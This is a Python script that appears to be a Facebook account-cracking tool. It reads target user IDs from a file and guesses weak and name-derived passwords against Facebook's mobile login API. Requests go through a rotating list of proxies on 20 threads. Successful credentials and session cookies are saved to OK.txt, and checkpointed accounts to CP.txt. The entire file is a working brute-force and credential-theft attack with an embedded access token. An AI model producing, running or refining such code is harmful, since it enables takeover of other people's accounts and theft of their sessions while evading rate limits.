import requests, json, urllib.parse, os, random
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor
import pycurl

# Banner
banner = """
\033[1;91m██╗\033[1;92m██████╗ \033[1;93m███████╗ \033[1;94m█████╗ \033[1;95m███╗   ██╗     \033[1;96m█████╗ \033[1;91m██╗  ██╗\033[1;92m███╗   ███╗\033[1;93m\033[1;91mA\033[1;92mH\033[1;93mM\033[1;94mE\033[1;95mD\033[0m \033[1;96m███████╗██████╗\033[0m
\033[1;91m██║\033[1;92m██╔══██╗\033[1;93m██╔════╝\033[1;94m██╔══██╗\033[1;95m████╗  ██║    \033[1;96m██╔══██╗\033[1;91m██║  ██║\033[1;92m████╗ ████║\033[1;93m\033[1;91mA\033[1;92mH\033[1;93mM\033[1;94mE\033[1;95mD\033[0m \033[1;96m██╔════╝██╔══██╗\033[0m
\033[1;91m██║\033[1;92m██████╔╝\033[1;93m█████╗  \033[1;94m███████║\033[1;95m██╔██╗ ██║    \033[1;96m███████║\033[1;91m███████║\033[1;92m██╔████╔██║\033[1;93m\033[1;91mA\033[1;92mH\033[1;93mM\033[1;94mE\033[1;95mD\033[0m \033[1;96m█████╗  ██║  ██║\033[0m
\033[1;91m██║\033[1;92m██╔══██╗\033[1;93m██╔══╝  \033[1;94m██╔══██║\033[1;95m██║╚██╗██║    \033[1;96m██╔══██║\033[1;91m██╔══██║\033[1;92m██║╚██╔╝██║\033[1;93m\033[1;91mA\033[1;92mH\033[1;93mM\033[1;94mE\033[1;95mD\033[0m \033[1;96m██╔══╝  ██║  ██║\033[0m
\033[1;91m██║\033[1;92m██║  ██║\033[1;93m██║     \033[1;94m██║  ██║\033[1;95m██║ ╚████║    \033[1;96m██║  ██║\033[1;91m██║  ██║\033[1;92m██║ ╚═╝ ██║\033[1;93m\033[1;91mA\033[1;92mH\033[1;93mM\033[1;94mE\033[1;95mD\033[0m \033[1;96m███████╗██████╔╝\033[0m
\033[1;91m╚═╝\033[1;92m╚═╝  ╚═╝\033[1;93m╚═╝     \033[1;94m╚═╝  ╚═╝\033[1;95m╚═╝  ╚═══╝    \033[1;96m╚═╝  ╚═╝\033[1;91m╚═╝  ╚═╝\033[1;92m╚═╝     ╚═╝\033[1;93m\033[1;91mA\033[1;92mH\033[1;93mM\033[1;94mE\033[1;95mD\033[0m \033[1;96m╚══════╝╚═════╝\033[0m
"""

# Static password list
base_passwords = [
    '123456', '123123', '111222', '12345678', '123456789',
    '111111', '112233', '555555', '222222', '333333', 'password'
]

# Full proxy list from user
proxies = [
    '102.132.52.226:8080', '110.238.111.229:8080', '110.238.116.82:8015',
    '113.108.13.120:4433', '113.108.13.120:8083', '115.29.148.215:45554',
    '116.63.130.30:30001', '117.250.3.58:8080', '119.13.111.169:1111',
    '120.25.189.254:8008', '120.46.215.52:41890', '120.79.7.173:8085',
    '123.60.109.71:8282', '13.208.43.139:3128', '13.40.33.253:3128',
    '140.210.196.193:19', '159.138.255.141:8080', '170.85.158.82:10005',
    '18.224.188.107:3128', '18.228.42.104:3128', '18.60.233.122:4270',
    '181.174.164.221:80', '36.138.53.26:10017', '39.100.88.89:8443',
    '39.102.213.3:80', '39.104.89.111:83', '41.110.10.205:8888',
    '45.114.142.178:80', '47.113.203.122:21025', '47.113.219.226:9090',
    '47.113.221.120:3127', '47.120.0.231:3128', '47.122.5.165:80',
    '47.122.57.58:80', '47.243.50.83:8082', '47.245.34.161:5566',
    '47.252.20.42:4145', '47.254.153.78:8024', '47.91.95.174:9002',
    '47.92.152.43:12000', '47.92.242.45:8118', '49.0.246.130:443',
    '49.0.252.39:1000', '54.219.186.252:9909', '8.130.36.163:9080',
    '8.148.20.126:80', '8.208.85.34:6969', '8.208.90.243:8081',
    '8.209.68.1:8090', '8.219.43.134:8181', '94.74.80.88:9090',
    '95.47.238.254:3128'
]

ACCESS_TOKEN = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

def fetch_name(uid):
    try:
        r = requests.get(f"https://graph.facebook.com/{uid}?fields=name&access_token={ACCESS_TOKEN}", timeout=5)
        return r.json().get("name")
    except:
        return None

def build_passwords(uid, name=None):
    pwds = base_passwords.copy()
    if name:
        n = name.replace(" ", "").lower()
        pwds += [f"{n}123", f"{n}@123", f"{n}2024", f"{n}01", f"{n}1122", n + uid[-4:]]
    return pwds

def try_login(uid, pwd):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'b-api.facebook.com'
    }

    payload = {
        'email': uid,
        'password': pwd,
        'access_token': ACCESS_TOKEN,
        'format': 'json',
        'sdk_version': '2',
        'generate_session_cookies': '1',
        'locale': 'en_US',
        'method': 'auth.login'
    }

    buffer = BytesIO()
    curl = pycurl.Curl()
    curl.setopt(curl.URL, "https://b-api.facebook.com/method/auth.login")
    curl.setopt(curl.POST, 1)
    curl.setopt(curl.POSTFIELDS, urllib.parse.urlencode(payload))
    curl.setopt(curl.WRITEDATA, buffer)
    curl.setopt(curl.TIMEOUT, 10)
    curl.setopt(curl.HTTPHEADER, [f"{k}: {v}" for k, v in headers.items()])

    # Set random proxy
    proxy = random.choice(proxies)
    curl.setopt(pycurl.PROXY, proxy)
    curl.setopt(pycurl.PROXYTYPE, pycurl.PROXYTYPE_HTTP)

    try:
        curl.perform()
        result = json.loads(buffer.getvalue().decode())
        if "session_key" in result:
            cookie = "; ".join([f"{c['name']}={c['value']}" for c in result["session_cookies"]])
            print(f"\033[1;92m[OK] {uid} | {pwd} | 🍪 {cookie}\033[0m")
            open("OK.txt", "a").write(f"{uid}|{pwd}|{cookie}\n")
            return "OK"
        elif "error_msg" in result and "checkpoint" in result["error_msg"].lower():
            if "invalid" not in result["error_msg"].lower():
                print(f"\033[1;93m[CP] {uid} | {pwd}\033[0m")
                open("CP.txt", "a").write(f"{uid}|{pwd}\n")
                return "CP"
    except Exception as e:
        print(f"\033[1;91m[ERROR] {uid} | {pwd} | {str(e).split(':')[0]}\033[0m")
    finally:
        curl.close()
        buffer.close()
    return None

def worker(uid):
    name = fetch_name(uid)
    pwds = build_passwords(uid, name)
    for pwd in pwds:
        result = try_login(uid, pwd)
        if result in ["OK", "CP"]:
            break

def main():
    os.system("clear")
    print(banner)
    try:
        uids = open("uids.txt").read().splitlines()
    except:
        print("❌ uids.txt File not found")
        return

    print(f"\n📂 Total UIDs: {len(uids)}")
    print(f"🌐 Loaded {len(proxies)} proxies")
    print("🚀 Starting cracking...\n")

    with ThreadPoolExecutor(max_workers=20) as ex:
        ex.map(worker, uids)

if __name__ == "__main__":
    main()
